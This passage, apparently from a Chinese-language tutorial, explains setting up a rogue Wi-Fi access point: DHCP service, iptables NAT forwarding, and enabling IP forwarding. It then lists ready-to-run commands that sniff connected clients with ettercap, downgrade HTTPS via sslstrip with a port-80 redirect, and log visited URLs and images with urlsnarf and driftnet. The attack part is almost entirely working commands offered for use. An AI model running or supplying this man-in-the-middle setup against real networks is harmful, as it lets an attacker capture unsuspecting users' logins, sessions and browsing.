
## dhcp服务 ##

### 安装dhcp服务 ###

    apt-get install isc-dhcp-server

### 启动dhcp服务 ###

    dhcpd -d -f -cf dhcpd.conf <INTERFACE>
    
## 使用iptables设置转发 ##

使用iptables设置转发，将用户连接SoftAP后的数据，转发到internet上，是非常关键的一步。网上各种版本很多，其实最简单的实现就一句指令：

    iptables -t nat -A POSTROUTING --out-interface $FAKE_AP_INTERNET -j MASQUERADE    #$FAKE_AP_INTERNET是外网接口
    
注意，转发生效需要本机开启ip_forward功能。指令是：

    echo "1" > /proc/sys/net/ipv4/ip_forward

由于后面运行ettercap时，会将该值再次变为0，所以等ettercap运行后再执行上述命令。

## 运行各种嗅探工具 ##

SoftAP建立并运行dhcp服务后，客户端就可以根据我们设定的规则连接上热点并正常浏览网页，运行各个程序了。接下来，就是针对Soft AP的接口at0，执行各种嗅探：

    ettercap -Tzq -i $FAKE_AP_AT_INTERFACE -w $SESSION_PATH/etter.pcap -L $SESSION_PATH/etter
    iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port $SSLSTRIP_PORT
    sslstrip -pkf -l $SSLSTRIP_PORT -w $SESSION_PATH/sslstrip.log 2>/dev/null
    urlsnarf -i $1 | grep http > $SESSION_PATH/url.txt
    tail -f $SESSION_PATH/url.txt
    driftnet -i $1 -d $SESSION_PATH/
